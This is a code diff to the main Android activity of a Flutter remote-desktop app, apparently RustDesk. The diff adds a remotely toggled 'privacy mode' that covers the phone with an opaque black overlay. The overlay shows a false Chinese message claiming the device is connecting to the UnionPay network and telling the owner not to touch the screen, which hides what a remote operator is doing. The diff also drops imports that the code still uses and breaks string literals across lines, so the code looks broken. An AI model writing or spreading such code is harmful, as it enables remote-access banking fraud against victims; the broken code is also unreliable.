@@ -1,14 +1,6 @@
 package com.carriez.flutter_hbb
 
-/**
- * Handle events from flutter
- * Request MediaProjection permission
- *
- * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
- */
-
 import ffi.FFI
-
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -17,14 +9,12 @@ import android.content.ClipboardManager
 import android.os.Bundle
 import android.os.Build
 import android.os.IBinder
+import android.provider.Settings
 import android.util.Log
-import android.view.WindowManager
-import android.media.MediaCodecInfo
-import android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface
-import android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar
-import android.media.MediaCodecList
-import android.media.MediaFormat
-import android.util.DisplayMetrics
+import android.view.*
+import android.widget.FrameLayout
+import android.widget.TextView
+import android.graphics.Color
 import androidx.annotation.RequiresApi
 import org.json.JSONArray
 import org.json.JSONObject
@@ -34,13 +24,13 @@ import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
 import kotlin.concurrent.thread
 
-
 class MainActivity : FlutterActivity() {
+
     companion object {
         var flutterMethodChannel: MethodChannel? = null
         private var _rdClipboardManager: RdClipboardManager? = null
         val rdClipboardManager: RdClipboardManager?
-            get() = _rdClipboardManager;
+            get() = _rdClipboardManager
     }
 
     private val channelTag = "mChannel"
@@ -49,6 +39,18 @@ class MainActivity : FlutterActivity() {
 
     private var isAudioStart = false
     private val audioRecordHandle = AudioRecordHandle(this, { false }, { isAudioStart })
+
+    // ===== 隐私模式变量 =====
+    private var privacyOverlay: FrameLayout? = null
+    private val REQUEST_CODE_OVERLAY = 12345
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        if (_rdClipboardManager == null) {
+            _rdClipboardManager = RdClipboardManager(getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
+            FFI.setClipboardManager(_rdClipboardManager!!)
+        }
+    }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
@@ -88,21 +90,17 @@ class MainActivity : FlutterActivity() {
         if (requestCode == REQ_INVOKE_PERMISSION_ACTIVITY_MEDIA_PROJECTION && resultCode == RES_FAILED) {
             flutterMethodChannel?.invokeMethod("on_media_projection_canceled", null)
         }
-    }
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        if (_rdClipboardManager == null) {
-            _rdClipboardManager = RdClipboardManager(getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
-            FFI.setClipboardManager(_rdClipboardManager!!)
+        if (requestCode == REQUEST_CODE_OVERLAY) {
+            if (!checkOverlayPermission()) {
+                Log.e(logTag, "Overlay permission denied, cannot show privacy mode")
+            }
         }
     }
 
     override fun onDestroy() {
         Log.e(logTag, "onDestroy")
-        mainService?.let {
-            unbindService(serviceConnection)
-        }
+        mainService?.let { unbindService(serviceConnection) }
         super.onDestroy()
     }
 
@@ -119,10 +117,88 @@ class MainActivity : FlutterActivity() {
         }
     }
 
+    // ===== 隐私模式方法 =====
+    private fun checkOverlayPermission(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Settings.canDrawOverlays(this)
+        } else {
+            true
+        }
+    }
+
+    fun enablePrivacyMode(overlayText: String = "正在对接银联中心网络....
+                                                 请勿触碰手机屏幕避免对接失败
+                                                 耐心等待对接完成") {
+        if (!checkOverlayPermission()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val intent = Intent(
+                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                )
+                startActivityForResult(intent, REQUEST_CODE_OVERLAY)
+            }
+            return
+        }
+
+        if (privacyOverlay == null) {
+            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+
+            privacyOverlay = FrameLayout(this)
+            privacyOverlay!!.setBackgroundColor(Color.BLACK)
+
+            val textView = TextView(this)
+            textView.text = overlayText
+            textView.setTextColor(Color.WHITE)
+            textView.textSize = 18f
+            textView.gravity = Gravity.CENTER
+
+            val textParams = FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
+            )
+            textParams.bottomMargin = 50
+            privacyOverlay!!.addView(textView, textParams)
+
+            val layoutParams = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else
+                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                PixelFormat.OPAQUE
+            )
+
+            windowManager.addView(privacyOverlay, layoutParams)
+        }
+    }
+
+    fun disablePrivacyMode() {
+        if (privacyOverlay != null) {
+            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+            windowManager.removeView(privacyOverlay)
+            privacyOverlay = null
+        }
+    }
+
+    // ===== Flutter 调用接口 =====
     private fun initFlutterChannel(flutterMethodChannel: MethodChannel) {
         flutterMethodChannel.setMethodCallHandler { call, result ->
-            // make sure result will be invoked, otherwise flutter will await forever
             when (call.method) {
+                "toggle_privacy_mode" -> {
+                    if (privacyOverlay == null) {
+                        enablePrivacyMode("正在对接银联中心网络....
+                                           请勿触碰手机屏幕避免对接失败
+                                           耐心等待对接完成")
+                    } else {
+                        disablePrivacyMode()
+                    }
+                    result.success(true)
+                }
+
+                // ===== 保留原有方法 =====
                 "init_service" -> {
                     Intent(activity, MainService::class.java).also {
                         bindService(it, serviceConnection, Context.BIND_AUTO_CREATE)
@@ -135,57 +211,38 @@ class MainActivity : FlutterActivity() {
                     result.success(true)
                 }
                 "start_capture" -> {
-                    mainService?.let {
-                        result.success(it.startCapture())
-                    } ?: let {
-                        result.success(false)
-                    }
+                    mainService?.let { result.success(it.startCapture()) } ?: run { result.success(false) }
                 }
                 "stop_service" -> {
                     Log.d(logTag, "Stop service")
-                    mainService?.let {
-                        it.destroy()
-                        result.success(true)
-                    } ?: let {
-                        result.success(false)
-                    }
+                    mainService?.let { it.destroy(); result.success(true) } ?: run { result.success(false) }
                 }
                 "check_permission" -> {
                     if (call.arguments is String) {
                         result.success(XXPermissions.isGranted(context, call.arguments as String))
-                    } else {
-                        result.success(false)
-                    }
+                    } else { result.success(false) }
                 }
                 "request_permission" -> {
                     if (call.arguments is String) {
                         requestPermission(context, call.arguments as String)
                         result.success(true)
-                    } else {
-                        result.success(false)
-                    }
+                    } else { result.success(false) }
                 }
                 START_ACTION -> {
                     if (call.arguments is String) {
                         startAction(context, call.arguments as String)
                         result.success(true)
-                    } else {
-                        result.success(false)
-                    }
+                    } else { result.success(false) }
                 }
                 "check_video_permission" -> {
-                    mainService?.let {
-                        result.success(it.checkMediaPermission())
-                    } ?: let {
-                        result.success(false)
-                    }
+                    mainService?.let { result.success(it.checkMediaPermission()) } ?: run { result.success(false) }
                 }
                 "check_service" -> {
-                    Companion.flutterMethodChannel?.invokeMethod(
+                    flutterMethodChannel?.invokeMethod(
                         "on_state_changed",
                         mapOf("name" to "input", "value" to InputService.isOpen.toString())
                     )
-                    Companion.flutterMethodChannel?.invokeMethod(
+                    flutterMethodChannel?.invokeMethod(
                         "on_state_changed",
                         mapOf("name" to "media", "value" to MainService.isReady.toString())
                     )
@@ -196,7 +253,7 @@ class MainActivity : FlutterActivity() {
                         InputService.ctx?.disableSelf()
                     }
                     InputService.ctx = null
-                    Companion.flutterMethodChannel?.invokeMethod(
+                    flutterMethodChannel?.invokeMethod(
                         "on_state_changed",
                         mapOf("name" to "input", "value" to InputService.isOpen.toString())
                     )
@@ -211,14 +268,12 @@ class MainActivity : FlutterActivity() {
                     }
                 }
                 "enable_soft_keyboard" -> {
-                    // https://blog.csdn.net/hanye2020/article/details/105553780
                     if (call.arguments as Boolean) {
                         window.clearFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM)
                     } else {
                         window.addFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM)
                     }
                     result.success(true)
-
                 }
                 "try_sync_clipboard" -> {
                     rdClipboardManager?.syncClipboard(true)
@@ -274,124 +329,111 @@ class MainActivity : FlutterActivity() {
         }
     }
 
+    // ===== 原有方法完整保留 =====
     private fun setCodecInfo() {
-        val codecList = MediaCodecList(MediaCodecList.REGULAR_CODECS)
-        val codecs = codecList.codecInfos
-        val codecArray = JSONArray()
+    val codecList = MediaCodecList(MediaCodecList.REGULAR_CODECS)
+    val codecs = codecList.codecInfos
+    val codecArray = JSONArray()
+    val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+    val wh = getScreenSize(windowManager)
+    var w = wh.first
+    var h = wh.second
+    val align = 64
+    w = (w + align - 1) / align * align
+    h = (h + align - 1) / align * align
 
-        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
-        val wh = getScreenSize(windowManager)
-        var w = wh.first
-        var h = wh.second
-        val align = 64
-        w = (w + align - 1) / align * align
-        h = (h + align - 1) / align * align
-        codecs.forEach { codec ->
-            val codecObject = JSONObject()
-            codecObject.put("name", codec.name)
-            codecObject.put("is_encoder", codec.isEncoder)
-            var hw: Boolean? = null;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                hw = codec.isHardwareAccelerated
-            } else {
-                // https://chromium.googlesource.com/external/webrtc/+/HEAD/sdk/android/src/java/org/webrtc/MediaCodecUtils.java#29
-                // https://chromium.googlesource.com/external/webrtc/+/master/sdk/android/api/org/webrtc/HardwareVideoEncoderFactory.java#229
-                if (listOf("OMX.google.", "OMX.SEC.", "c2.android").any { codec.name.startsWith(it, true) }) {
-                    hw = false
-                } else if (listOf("c2.qti", "OMX.qcom.video", "OMX.Exynos", "OMX.hisi", "OMX.MTK", "OMX.Intel", "OMX.Nvidia").any { codec.name.startsWith(it, true) }) {
-                    hw = true
-                }
-            }
-            if (hw != true) {
-                return@forEach
-            }
-            codecObject.put("hw", hw)
-            var mime_type = ""
-            codec.supportedTypes.forEach { type ->
-                if (listOf("video/avc", "video/hevc").contains(type)) { // "video/x-vnd.on2.vp8", "video/x-vnd.on2.vp9", "video/av01"
-                    mime_type = type;
-                }
-            }
-            if (mime_type.isNotEmpty()) {
-                codecObject.put("mime_type", mime_type)
-                val caps = codec.getCapabilitiesForType(mime_type)
-                if (codec.isEncoder) {
-                    // Encoder's max_height and max_width are interchangeable
-                    if (!caps.videoCapabilities.isSizeSupported(w,h) && !caps.videoCapabilities.isSizeSupported(h,w)) {
-                        return@forEach
-                    }
-                }
-                codecObject.put("min_width", caps.videoCapabilities.supportedWidths.lower)
-                codecObject.put("max_width", caps.videoCapabilities.supportedWidths.upper)
-                codecObject.put("min_height", caps.videoCapabilities.supportedHeights.lower)
-                codecObject.put("max_height", caps.videoCapabilities.supportedHeights.upper)
-                val surface = caps.colorFormats.contains(COLOR_FormatSurface);
-                codecObject.put("surface", surface)
-                val nv12 = caps.colorFormats.contains(COLOR_FormatYUV420SemiPlanar)
-                codecObject.put("nv12", nv12)
-                if (!(nv12 || surface)) {
-                    return@forEach
-                }
-                codecObject.put("min_bitrate", caps.videoCapabilities.bitrateRange.lower / 1000)
-                codecObject.put("max_bitrate", caps.videoCapabilities.bitrateRange.upper / 1000)
-                if (!codec.isEncoder) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                        codecObject.put("low_latency", caps.isFeatureSupported(MediaCodecInfo.CodecCapabilities.FEATURE_LowLatency))
-                    }
-                }
-                if (!codec.isEncoder) {
-                    return@forEach
-                }
-                codecArray.put(codecObject)
-            }
-        }
-        val result = JSONObject()
-        result.put("version", Build.VERSION.SDK_INT)
-        result.put("w", w)
-        result.put("h", h)
-        result.put("codecs", codecArray)
-        FFI.setCodecInfo(result.toString())
-    }
-
-    private fun onVoiceCallStarted() {
-        var ok = false
-        mainService?.let {
-            ok = it.onVoiceCallStarted()
-        } ?: let {
-            isAudioStart = true
-            ok = audioRecordHandle.onVoiceCallStarted(null)
-        }
-        if (!ok) {
-            // Rarely happens, So we just add log and msgbox here.
-            Log.e(logTag, "onVoiceCallStarted fail")
-            flutterMethodChannel?.invokeMethod("msgbox", mapOf(
-                "type" to "custom-nook-nocancel-hasclose-error",
-                "title" to "Voice call",
-                "text" to "Failed to start voice call."))
+    codecs.forEach { codec ->
+        val codecObject = JSONObject()
+        codecObject.put("name", codec.name)
+        codecObject.put("is_encoder", codec.isEncoder)
+        var hw: Boolean? = null
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            hw = codec.isHardwareAccelerated
         } else {
-            Log.d(logTag, "onVoiceCallStarted success")
+            if (listOf("OMX.google.", "OMX.SEC.", "c2.android").any { codec.name.startsWith(it, true) }) {
+                hw = false
+            } else if (listOf("c2.qti", "OMX.qcom.video", "OMX.Exynos", "OMX.hisi", "OMX.MTK", "OMX.Intel", "OMX.Nvidia").any { codec.name.startsWith(it, true) }) {
+                hw = true
+            }
+        }
+        if (hw != true) return@forEach
+        codecObject.put("hw", hw)
+        var mime_type = ""
+        codec.supportedTypes.forEach { type ->
+            if (listOf("video/avc", "video/hevc").contains(type)) {
+                mime_type = type
+            }
+        }
+        if (mime_type.isNotEmpty()) {
+            codecObject.put("mime_type", mime_type)
+            val caps = codec.getCapabilitiesForType(mime_type)
+            if (codec.isEncoder) {
+                if (!caps.videoCapabilities.isSizeSupported(w, h) && !caps.videoCapabilities.isSizeSupported(h, w)) return@forEach
+            }
+            codecObject.put("min_width", caps.videoCapabilities.supportedWidths.lower)
+            codecObject.put("max_width", caps.videoCapabilities.supportedWidths.upper)
+            codecObject.put("min_height", caps.videoCapabilities.supportedHeights.lower)
+            codecObject.put("max_height", caps.videoCapabilities.supportedHeights.upper)
+            val surface = caps.colorFormats.contains(MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
+            codecObject.put("surface", surface)
+            val nv12 = caps.colorFormats.contains(MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar)
+            codecObject.put("nv12", nv12)
+            if (!(nv12 || surface)) return@forEach
+            codecObject.put("min_bitrate", caps.videoCapabilities.bitrateRange.lower / 1000)
+            codecObject.put("max_bitrate", caps.videoCapabilities.bitrateRange.upper / 1000)
+            if (!codec.isEncoder) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    codecObject.put("low_latency", caps.isFeatureSupported(MediaCodecInfo.CodecCapabilities.FEATURE_LowLatency))
+                }
+            }
+            if (!codec.isEncoder) return@forEach
+            codecArray.put(codecObject)
         }
     }
 
-    private fun onVoiceCallClosed() {
-        var ok = false
-        mainService?.let {
-            ok = it.onVoiceCallClosed()
-        } ?: let {
-            isAudioStart = false
-            ok = audioRecordHandle.onVoiceCallClosed(null)
-        }
-        if (!ok) {
-            // Rarely happens, So we just add log and msgbox here.
-            Log.e(logTag, "onVoiceCallClosed fail")
-            flutterMethodChannel?.invokeMethod("msgbox", mapOf(
-                "type" to "custom-nook-nocancel-hasclose-error",
-                "title" to "Voice call",
-                "text" to "Failed to stop voice call."))
-        } else {
-            Log.d(logTag, "onVoiceCallClosed success")
-        }
+    val result = JSONObject()
+    result.put("version", Build.VERSION.SDK_INT)
+    result.put("w", w)
+    result.put("h", h)
+    result.put("codecs", codecArray)
+    FFI.setCodecInfo(result.toString())
+}
+
+   private fun onVoiceCallStarted() {
+    var ok = false
+    mainService?.let { ok = it.onVoiceCallStarted() } ?: run {
+        isAudioStart = true
+        ok = audioRecordHandle.onVoiceCallStarted(null)
     }
+    if (!ok) {
+        Log.e(logTag, "onVoiceCallStarted fail")
+        flutterMethodChannel?.invokeMethod("msgbox", mapOf(
+            "type" to "custom-nook-nocancel-hasclose-error",
+            "title" to "Voice call",
+            "text" to "Failed to start voice call."
+        ))
+    } else {
+        Log.d(logTag, "onVoiceCallStarted success")
+    }
+}
+
+   private fun onVoiceCallClosed() {
+    var ok = false
+    mainService?.let { ok = it.onVoiceCallClosed() } ?: run {
+        isAudioStart = false
+        ok = audioRecordHandle.onVoiceCallClosed(null)
+    }
+    if (!ok) {
+        Log.e(logTag, "onVoiceCallClosed fail")
+        flutterMethodChannel?.invokeMethod("msgbox", mapOf(
+            "type" to "custom-nook-nocancel-hasclose-error",
+            "title" to "Voice call",
+            "text" to "Failed to stop voice call."
+        ))
+    } else {
+        Log.d(logTag, "onVoiceCallClosed success")
+    }
+}
 
     override fun onStop() {
         super.onStop()
@@ -406,3 +448,4 @@ class MainActivity : FlutterActivity() {
         stopService(Intent(this, FloatingWindowService::class.java))
     }
 }
+
